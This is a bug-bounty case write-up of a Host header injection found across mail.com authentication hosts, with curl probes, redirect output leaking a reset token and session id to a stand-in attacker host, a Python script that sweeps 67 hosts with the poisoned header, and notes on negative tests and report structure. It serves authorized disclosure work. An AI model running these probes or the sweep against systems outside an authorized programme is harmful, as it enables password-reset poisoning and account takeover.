# Worked case — mail.com Host header injection (2026-10-21)

Bounty programme: bugbounty.mail.com (United Internet / 1&1 Mail & Media). Scope:
"web applications within the authenticated area ... including the authentication systems".
Reward discretionary (no published table). Validated 3x, staged, operator sent.

## What was found

Host header trusted for absolute-URL generation across the Wicket (Java) auth cluster:

```
$ curl -s -D - -o /dev/null 'https://password.mail.com/passwordrecovery/' \
    -H 'Host: attacker-controlled.example.com'
HTTP/1.1 302 Found
Location: https://attacker-controlled.example.com/passwordrecovery/?srttkn=1fa6a183-...

$ curl -s -D - -o /dev/null 'https://account.mail.com/' \
    -H 'Host: attacker-controlled.example.com'
HTTP/1.1 302 Found
Location: https://attacker-controlled.example.com/ciss/login;jsessionid=17CFFF01289785F3065D4F0B7726D19C
```

Five hosts, one root cause (whole-live-host sweep, see below):
`password.mail.com` (srttkn), `account.mail.com`, `ciss.mail.com`,
`account-ba.mail.com`, `account-lxa.mail.com` (all jsessionid in `/ciss/login;jsessionid=`).

## Technique — sweep ALL live hosts, not just the obvious one

The obvious endpoint (password reset) was found by reading robots.txt
(`Allow: /recover/$` style hints). The account/ciss hosts were only found by sweeping
every live host with the poisoned header. One script, 67 hosts, ~30 s:

```python
import requests, concurrent.futures
EVIL = "attacker-controlled.example.com"
def probe(u):
    r = requests.get(u, headers={"Host": EVIL}, timeout=10, allow_redirects=False)
    loc = r.headers.get("location", "")
    if EVIL in loc or EVIL in r.text[:3000]:
        return (u, r.status_code, loc[:90])
with concurrent.futures.ThreadPoolExecutor(15) as ex:
    for res in ex.map(probe, hosts):
        if res: print(res)
```

Lesson: the first vulnerable host is rarely the only one — shared framework clusters
(ciss/account/-ba/-lxa are the same Wicket app on four hostnames) all behave identically.
Report the full host list; it changes the remediation scope.

## Negative tests that strengthened the report

Document these in the report so triage doesn't repeat them:

1. **URL-supplied jsessionid session fixation — NEGATIVE.**
   `GET /ciss/login;jsessionid=DEADBEEF...` → container issues a *fresh* JSESSIONID
   cookie and ignores the URL value (fixed id never echoed). Java URL-session fixation
   is not reachable here.
2. **Cache poisoning — NEGATIVE.** No `CF-Cache-Status` / `Age` on the poisoned
   redirect; every request mints a fresh srttkn. Nothing to poison.
3. **TRACE enabled (200, `content-type: message/http`)** — informational; reflects
   request headers incl. `x-forwarded-for`. XST largely mitigated by HttpOnly cookies.
   Most programmes treat enabled TRACE as non-qualifying; mention as informational only.
4. **Method tampering** — PUT/DELETE/PATCH on the Wicket path all return the normal
   login page HTML. No bypass.

## Report shape that worked

- Honest boundary: no victim account, no reset email observed. "Email-link poisoning
  is the direct consequence of the demonstrated URL-generation behaviour, not an
  observed email." This kept the claim defensible.
- Impact section = numbered attacker actions (reset-link poisoning → ATO; token
  leakage) + explicit "what this does NOT give".
- Live-capture screenshot rendered from REAL requests made at page-render time
  (local renderer pattern from bug-report-delivery), embedded in the PDF.
- Operator sent the first version (2 hosts); an expanded version (5 hosts + the
  negative tests) was staged as a threaded supplement draft (`Re:` + In-Reply-To) —
  see bug-report-delivery for the post-send supplement pattern.

## Environment notes (mail.com)

- Signup geo-walls Indonesian IPs ("registration is no longer possible") — same class
  as Fastmail/Byte Federal geo-gates. The auth-system surface stayed reachable
  unauthenticated, which is where this finding lived.
- Wicket app fingerprint leaks the full Java package
  (`com.unitedinternet.mam.csc.passwordrecovery.ui.wicket.pages...`) in resource URLs —
  informational.
